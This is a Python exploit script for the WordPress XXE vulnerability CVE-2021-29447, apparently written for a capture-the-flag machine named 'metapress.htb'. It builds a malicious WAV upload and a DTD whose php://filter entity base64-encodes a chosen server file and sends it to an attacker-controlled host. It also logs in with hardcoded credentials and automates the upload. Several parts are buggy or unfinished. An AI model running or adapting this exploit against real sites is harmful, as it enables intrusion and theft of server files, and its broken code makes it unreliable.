import io
import logging
import json
import sys
from io import BytesIO

def gen(args):
  ip = args.ip
  port = args.port
  dtd_url = f'http://{ip}:{port}'
  dtd_filename = args.dtdfilename
  outname = 'payload2.wav'
  xxe_payload = gen_xxe_payload(dtd_url, dtd_filename)
  with open(outname, 'wb') as fout:
    fout.write(xxe_payload.get_bytes())
  print(f"[+] wrote payload to {outname}")
  dtdname = gen_dtd(dtd_url, dtd_filename)
  print(f"[+] wrote DTD to {dtdname}")
  upload_xxe(outname)


def gen_xxe_payload(dtd_url, dtd_filename) -> io.BytesIO:
  """Build a WAV file that trigger CVE-2021-29447"""
  logging.info(f"Building payload for {dtd_url=}")
  header= b'RIFF\xb2\0\0\0WAVE'
  xml= f'''<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '{dtd_url}/{dtd_filename}'>%remote;%init;%trick;]>'''
  rest=b'iXML'

  size = len(xml)
  size = size.to_bytes(4, 'little')

  data = BytesIO()
  # write a valid wave
  data.write(header)
  data.write(rest)
  data.write(size)
  data.write(xml.encode())
  # then frames
  data.write(b'fmt \x10\x00\x00\x00\x01\x00\x01\x00D\xac\x00\x00\x10\xb1\x02\x00\x04\x00 \x00data\x10\x00\x00\x00\x00\x00\x00\x00e;\xdf\xff\x9b\xc4 \x00\x04\x00\x00\x00\n')
  return data


def gen_dtd(dtd_url, dtd_filename):
  """

  :param dtd_url: http://127.0.0.1:80
  :param dtd_filename: evil.dtd
  :return:
  """
  # generating malicious dtd
  filename = args.filename
  dtd_content = f'''<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={filename}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '{dtd_url}/?p=%file;'>" >
'''
  data = BytesIO()
  data.write(dtd_content.encode())
  return data


def upload_xxe(filename):
  import requests, json, os
  s = requests.session()
  p={'http': 'http://127.0.0.1:8080'}
  s.proxies = p
  # TODO we need to reuse sessions, because it gets slow if we don't logout
  if os.path.exists('headers'):
    headers = json.load(open('headers', 'r'))
    s.headers = headers
  ret = s.get('http://metapress.htb/wp-login.php')
  print(ret.status_code)
  print(ret.content)
  # save headers and things
  if ret.status_code == 200:
    json.dump(dict(ret.headers), open('headers', 'w'))
  d = {'log':'manager@metapress.htb',
  'pwd':'partylikearockstar',
  'wp-submit':'Log+In',
  'redirect_to':'http://metapress.htb/wp-admin/?testcookie=1'}
  ret = s.post('http://metapress.htb/wp-login.php', data=d)
  print(ret.status_code)
#  print(ret.text)
  ret = s.get('http://metapress.htb/wp-admin/upload.php')
  print(ret.status_code)
  # get the nonce
  # _wpnonce":"000e5f34d2"
  import re
  wpnonce = re.search('_wpnonce":"([0-9a-z]+)"', ret.text).group(1)
  print(f"{wpnonce=}")
  # refresh the antispam
  hb_nonce = re.search('{"nonce":"([0-9a-z]+)"};', ret.text).group(1)
  print(f"{hb_nonce=}")
  d = {'interval':'60','_nonce':'adc2c82007','action':'heartbeat','screen_id':'upload',
  'has_focus':'false'}
  ret = s.post('http://metapress.htb/wp-admin/admin-ajax.php', data=d)
  print(ret.status_code)
  print(ret.content)
  d = ret.json()
#  if 'heartbeat_nonce' in d:
#    wpnonce = d['heartbeat_nonce']
  print(f"{wpnonce=}")
  files = {'name': filename, 
           'action':'upload-attachement',
           '_wpnonce': wpnonce,
           'async-upload': (filename, open(filename, 'rb').read(), 'audio/x-wav')
           }
  ret = s.post('http://metapress.htb/wp-admin/async-upload.php', files=files)
  print(ret.status_code)
  print(ret.content)
  

def build_payload(session, target_url, dtd_url, dtd_filename, **kwargs) -> (str, dict, bytes):
  """xxetimes callback sig
  we build a full multipart upload
  """
  logging.info("file: request.headers is a file of headers")
  logging.info("file: request.data is a data file with the body content")
  logging.info("  this module will append the wav file data at the end")
  # FIXME: close the multipart. sht.

  method = 'POST'
  headers = {}
  wpnonce = kwargs.get('wpnonce', '')
  payload = b'multipart thing here ' + wpnonce.encode()
  wav_payload = gen_xxe_payload(dtd_url, dtd_filename)

  # test 1 = load BURP file, just replace the payload
  headers_raw = open('request.headers', 'r').read()
  # load headers in session
  for h_line in headers_raw.split('\n'):  # FIXME newline.
    try:
      h, rest = h_line.split(': ')
      if h.lower() in ['cookie', 'origin', 'content-type']:
        headers[h] = rest
    except:
      ...
  logging.debug(f'{headers=}')
  # load data in session
  data = open('request.data', 'rb').read()
  data = data + wav_payload.getvalue()
  boundary = b'---------------------------214067375214075720372354475995'
  end_boundary = b'--' + boundary + b'--\r\n'
  data = data + b'\r\n' + end_boundary

  res = session.post(f'{target_url}/wp-admin/async-upload.php', headers=headers, data=data)
  return res


if __name__ == '__main__':
  import argparse
  parser = argparse.ArgumentParser()
  parser.add_argument("ip", help="IP for the http server for evil.dtd")
  parser.add_argument("port", help="port for http server for evil.dtd")
  parser.add_argument("dtdfilename", help="filename for malicious dtd")
  parser.add_argument("filename", help="filename on target to exfil")
  args = parser.parse_args()
  gen(args)
